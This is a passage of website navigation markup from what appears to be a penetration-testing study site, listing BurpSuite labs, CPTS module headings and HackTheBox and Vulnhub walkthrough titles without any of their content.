          <label class="md-nav__title" for="__nav_2_4">
            <span class="md-nav__icon md-icon"></span>
            Burpsuite
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../burpsuite/burpsuite-labs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    BurpSuite Labs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../burpsuite/burpsuite-broken-access-control/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Broken access control labs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../burpsuite/burpsuite-insecure-deserialization/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Insecure deserialization
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../burpsuite/burpsuite-jwt/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    JWT labs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../burpsuite/burpsuite-ssti/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SSTI labs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../burpsuite/burpsuite-sqli/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SQLi labs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../burpsuite/burpsuite-ssrf/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SSRF labs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../burpsuite/burpsuite-xss/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    XSS labs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../burpsuite/burpsuite-xxe/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    XXE labs
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" checked>
        
          
          <label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    CPTS
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2_5">
            <span class="md-nav__icon md-icon"></span>
            CPTS
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cpts-index/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Index of modules
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cpts-cheat-sheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cheat sheet
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Lab resolution
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Lab resolution
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#getting-started" class="md-nav__link">
    <span class="md-ellipsis">
      Getting Started
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Getting Started">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#pentesting-basics" class="md-nav__link">
    <span class="md-ellipsis">
      Pentesting Basics
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Pentesting Basics">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#service-scanning" class="md-nav__link">
    <span class="md-ellipsis">
      Service scanning
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Web Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#public-exploits" class="md-nav__link">
    <span class="md-ellipsis">
      Public Exploits
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privilege-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      Privilege Escalation
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attacking-your-first-box" class="md-nav__link">
    <span class="md-ellipsis">
      Attacking your first box
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Attacking your first box">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nibbles-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Nibbles - Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nibbles-initial-foothold" class="md-nav__link">
    <span class="md-ellipsis">
      Nibbles - Initial Foothold
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nibbles-privilege-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      Nibbles - Privilege Escalation
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#knowledge-check" class="md-nav__link">
    <span class="md-ellipsis">
      Knowledge Check
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#network-enumeration-with-nmap" class="md-nav__link">
    <span class="md-ellipsis">
      Network Enumeration with Nmap
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Network Enumeration with Nmap">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#host-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Host Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Host Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#host-discovery" class="md-nav__link">
    <span class="md-ellipsis">
      Host Discovery
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#host-and-port-scanning" class="md-nav__link">
    <span class="md-ellipsis">
      Host and Port Scanning
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#saving-the-results" class="md-nav__link">
    <span class="md-ellipsis">
      Saving the Results
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#service-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Service Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nmap-scripting-engine" class="md-nav__link">
    <span class="md-ellipsis">
      Nmap Scripting Engine
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bypass-security-measures" class="md-nav__link">
    <span class="md-ellipsis">
      Bypass Security Measures
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Bypass Security Measures">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#firewall-and-idsips-evasion-easy-lab" class="md-nav__link">
    <span class="md-ellipsis">
      Firewall and IDS/IPS Evasion - Easy Lab
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#firewall-and-idsips-evasion-medium-lab" class="md-nav__link">
    <span class="md-ellipsis">
      Firewall and IDS/IPS Evasion - Medium Lab
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#firewall-and-idsips-evasion-hard-lab" class="md-nav__link">
    <span class="md-ellipsis">
      Firewall and IDS/IPS Evasion - Hard Lab
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#footprinting" class="md-nav__link">
    <span class="md-ellipsis">
      Footprinting
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Footprinting">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#host-based-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Host Based Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Host Based Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ftp" class="md-nav__link">
    <span class="md-ellipsis">
      FTP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb" class="md-nav__link">
    <span class="md-ellipsis">
      SMB
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nfs" class="md-nav__link">
    <span class="md-ellipsis">
      NFS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dns" class="md-nav__link">
    <span class="md-ellipsis">
      DNS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smtp" class="md-nav__link">
    <span class="md-ellipsis">
      SMTP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#imap-pop3" class="md-nav__link">
    <span class="md-ellipsis">
      IMAP / POP3
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#snmp" class="md-nav__link">
    <span class="md-ellipsis">
      SNMP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mysql" class="md-nav__link">
    <span class="md-ellipsis">
      MySQL
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mssql" class="md-nav__link">
    <span class="md-ellipsis">
      MSSQL
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#oracle-tns" class="md-nav__link">
    <span class="md-ellipsis">
      Oracle TNS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ipmi" class="md-nav__link">
    <span class="md-ellipsis">
      IPMI
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#skills-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      Skills assessment
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Skills assessment">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#footprinting-lab-easy" class="md-nav__link">
    <span class="md-ellipsis">
      Footprinting Lab - Easy
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#footprinting-lab-medium" class="md-nav__link">
    <span class="md-ellipsis">
      Footprinting Lab - Medium
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#footprinting-lab-hard" class="md-nav__link">
    <span class="md-ellipsis">
      Footprinting Lab - Hard
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#information-gathering-web-edition" class="md-nav__link">
    <span class="md-ellipsis">
      Information Gathering - Web Edition
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Information Gathering - Web Edition">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#whois" class="md-nav__link">
    <span class="md-ellipsis">
      WHOIS
    </span>
  </a>
  
    <nav class="md-nav" aria-label="WHOIS">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#utilizing-whois" class="md-nav__link">
    <span class="md-ellipsis">
      Utilizing WHOIS
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dns-subdomains" class="md-nav__link">
    <span class="md-ellipsis">
      DNS &amp; Subdomains
    </span>
  </a>
  
    <nav class="md-nav" aria-label="DNS & Subdomains">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#digging-dns" class="md-nav__link">
    <span class="md-ellipsis">
      Digging DNS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#subdomain-bruteforcing" class="md-nav__link">
    <span class="md-ellipsis">
      Subdomain BruteForcing
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dns-zone-transfers" class="md-nav__link">
    <span class="md-ellipsis">
      DNS Zone Transfers
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#virtual-hosts" class="md-nav__link">
    <span class="md-ellipsis">
      Virtual Hosts
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#fingerprinting" class="md-nav__link">
    <span class="md-ellipsis">
      Fingerprinting
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Fingerprinting">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#fingerprinting_1" class="md-nav__link">
    <span class="md-ellipsis">
      Fingerprinting
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#crawling" class="md-nav__link">
    <span class="md-ellipsis">
      Crawling
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Crawling">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#creepy-crawlies" class="md-nav__link">
    <span class="md-ellipsis">
      Creepy crawlies
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-archives" class="md-nav__link">
    <span class="md-ellipsis">
      Web Archives
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#skills-assessment_1" class="md-nav__link">
    <span class="md-ellipsis">
      Skills Assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vulnerability-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerability Assessment
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Vulnerability Assessment">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nesus" class="md-nav__link">
    <span class="md-ellipsis">
      Nesus
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Nesus">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nessus-skills-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      Nessus Skills assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#openvass" class="md-nav__link">
    <span class="md-ellipsis">
      Openvass
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Openvass">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#openvass-skills-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      Openvass Skills assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#file-transfers" class="md-nav__link">
    <span class="md-ellipsis">
      File Transfers
    </span>
  </a>
  
    <nav class="md-nav" aria-label="File Transfers">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#windows-file-transfer-methods" class="md-nav__link">
    <span class="md-ellipsis">
      Windows File Transfer methods
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#linux-file-transfer-methods" class="md-nav__link">
    <span class="md-ellipsis">
      Linux File Transfer methods
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#shells-payloads" class="md-nav__link">
    <span class="md-ellipsis">
      Shells &amp; Payloads
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Shells & Payloads">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#shell-basics" class="md-nav__link">
    <span class="md-ellipsis">
      Shell Basics
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#payloads" class="md-nav__link">
    <span class="md-ellipsis">
      Payloads
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-shells" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Shells
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nix-shells" class="md-nav__link">
    <span class="md-ellipsis">
      NIX Shells
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-shells" class="md-nav__link">
    <span class="md-ellipsis">
      Web Shells
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Web Shells">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#laudanum" class="md-nav__link">
    <span class="md-ellipsis">
      laudanum
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#antak-webshell" class="md-nav__link">
    <span class="md-ellipsis">
      antak webshell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#php-shells" class="md-nav__link">
    <span class="md-ellipsis">
      php shells
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#skills-assessment_2" class="md-nav__link">
    <span class="md-ellipsis">
      Skills Assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#using-the-metasploit-framework" class="md-nav__link">
    <span class="md-ellipsis">
      Using the Metasploit Framework
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Using the Metasploit Framework">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#introduction-to-metasploit" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction to Metasploit
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#msf-components" class="md-nav__link">
    <span class="md-ellipsis">
      MSF Components
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#msf-sessions" class="md-nav__link">
    <span class="md-ellipsis">
      MSF Sessions
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#password-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Password Attacks
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Password Attacks">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#remote-password-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Remote Password Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-local-password-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Local Password Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#linux-local-password-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Linux Local Password Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-lateral-movement" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Lateral Movement
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cracking-files" class="md-nav__link">
    <span class="md-ellipsis">
      Cracking Files
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#skills-assessment-1-password-attack-easy" class="md-nav__link">
    <span class="md-ellipsis">
      Skills Assessment 1: Password Attack Easy
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#skills-assessment-2-password-attack-medium" class="md-nav__link">
    <span class="md-ellipsis">
      Skills Assessment 2: Password Attack Medium
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#skills-assessment-3-password-attack-hard" class="md-nav__link">
    <span class="md-ellipsis">
      Skills Assessment 3: Password Attack Hard
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#attacking-common-services" class="md-nav__link">
    <span class="md-ellipsis">
      Attacking Common Services
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Attacking Common Services">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ftp_1" class="md-nav__link">
    <span class="md-ellipsis">
      FTP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb_1" class="md-nav__link">
    <span class="md-ellipsis">
      SMB
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sql-databases" class="md-nav__link">
    <span class="md-ellipsis">
      SQL Databases
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ejpt/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    eJPT
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ewpt-preparation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    eWPT
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../oci-fundamentals-preparation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Oracle Cloud Infrastructure
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Walkthroughs
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Walkthroughs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../walkthroughs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Index of walkthroughs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../vulnhub-goldeneye-1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vulnhub GoldenEye 1
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../vulnhub-raven-1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vulnhub Raven 1
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../vulnhub-raven-2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vulnhub Raven 2
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-active/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB active
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-appointment/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB appointment
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-archetype/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB archetype
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-bank/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB bank
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-base/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB base
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-crocodile/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB crocodile
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-explosion/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB explosion
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-forest/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB forest
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-friendzone/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB friendzone
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-funnel/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB funnel
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-greenhorn/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB greenhorn
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-included/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB included
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-ignition/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB ignition
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-lame/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB lame
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-markup/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB markup
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-metatwo/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB metatwo
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-mongod/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB mongod
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-nibbles/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB nibbles
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-nunchucks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB nunchucks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-oopsie/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB oopsie
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-omni/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB omni
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-pennyworth/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB pennyworth
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-photobomb/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB photobomb
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-popcorn/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB popcorn
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-redeemer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB redeemer
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-resolute/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB resolute
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-responder/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB responder
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-sauna/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB sauna
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-sequel/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB sequel
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-support/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB support
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-tactics/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB tactics
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-trick/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB trick
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-undetected/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB undetected
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-unified/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB unified
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../htb-usage/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB usage
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
